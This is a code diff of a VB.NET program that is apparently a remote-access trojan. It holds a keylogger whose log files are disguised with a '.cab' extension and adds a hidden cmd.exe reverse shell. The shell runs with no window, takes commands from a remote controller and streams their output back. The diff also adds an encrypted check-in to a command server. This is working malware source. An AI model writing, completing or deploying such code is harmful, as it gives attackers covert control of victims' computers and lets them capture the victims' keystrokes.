@@ -110,19 +110,15 @@ Public Class Main
     ''' <summary>
     ''' Webcam stream TODO: Implement
     ''' </summary>
-    Dim streamWebcam As Boolean = False ''??
+    Dim streamWebcam As Boolean = False
     ''' <summary>
     ''' Keylogger data file extension
     ''' </summary>
-    Dim klfext As String = ".cab" ''keylogger file extension
+    Dim klfext As String = ".cab"
     ''' <summary>
     ''' Keylogger instance
     ''' </summary>
-    Dim o As New KLogger ''keylogger
-    ''' <summary>
-    ''' CMD shell instance
-    ''' </summary>
-    Dim sh As CShell = New CShell
+    Dim o As New KLogger
 #End Region
 
 #Region "DLL Functions"
@@ -734,23 +730,58 @@ B:
 
                         C.Send(n.getspecs & Sep & infostring)
                     ''ip lan etc
-                    Case n.reconnect
+                    Case n.reconnect ''reconnect
                         C.DisConnect()
                     Case n.openshell ''new shell
+                        Try
+                            Shl.Kill()
+                        Catch ex As Exception
+                        End Try
+                        Shl = New Process
+                        Shl.StartInfo.RedirectStandardOutput = True
+                        Shl.StartInfo.RedirectStandardInput = True
+                        Shl.StartInfo.RedirectStandardError = True
+                        Shl.StartInfo.FileName = "cmd.exe"
+                        Shl.StartInfo.RedirectStandardError = True
+                        AddHandler CType(Shl, Process).OutputDataReceived, AddressOf RS
+                        AddHandler CType(Shl, Process).ErrorDataReceived, AddressOf RS
+                        AddHandler CType(Shl, Process).Exited, AddressOf ex
+                        Shl.StartInfo.UseShellExecute = False
+                        Shl.StartInfo.CreateNoWindow = True
+                        Shl.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
+                        Shl.EnableRaisingEvents = True
                         C.Send(n.openshell)
-                        sh = New CShell
-                        sh.createsession()
+                        Shl.Start()
+                        Shl.BeginErrorReadLine()
+                        Shl.BeginOutputReadLine()
                     Case n.putshell ''write to shell
-                        sh.execute(A(1))
+                        Shl.StandardInput.WriteLine(A(1))
                     Case n.endshell ''kill shell
-                        sh.closesession()
+                        Try
+                            Shl.Kill()
+                        Catch ex As Exception
+                        End Try
+                        Shl = Nothing
                 End Select
             End If
         Catch ex As Exception
             MsgBox(ex.Message & vbNewLine & ex.StackTrace) ''TODO: ABSOLUTELY REMOVE!
         End Try
-
     End Sub
+    Private Sub ex() ''exit shell
+        Try
+            C.Send(n.endshell)
+        Catch ex As Exception
+        End Try
+    End Sub
+    Private Sub RS(ByVal a As Object, ByVal e As Object) ''Handles shell data
+        Try
+            C.Send(n.getshell & Sep & e.Data)
+        Catch ex As Exception
+        End Try
+    End Sub
+
+    Private Shl As Process ''shell
 #End Region
 
     ''' <summary>
@@ -795,11 +826,13 @@ B:
         trust = False
         Dim response As String
         Try
+            ''todo add https
             response = WRequest("http://" & HOST & "/index.php", "0x1", "POST", "id=" & Crypt.AES.Encrypt(name, "hinki", Crypt.AES.salt, "SHA1", 1000, Crypt.AES.IV, 256) & "&iv=" & Crypt.AES.IV)
         Catch ex As Exception
             MsgBox(ex.Message)
         End Try
         ''MsgBox(response)
+        Me.InfoLabel.Text = response
     End Sub
 
     ''' <summary>
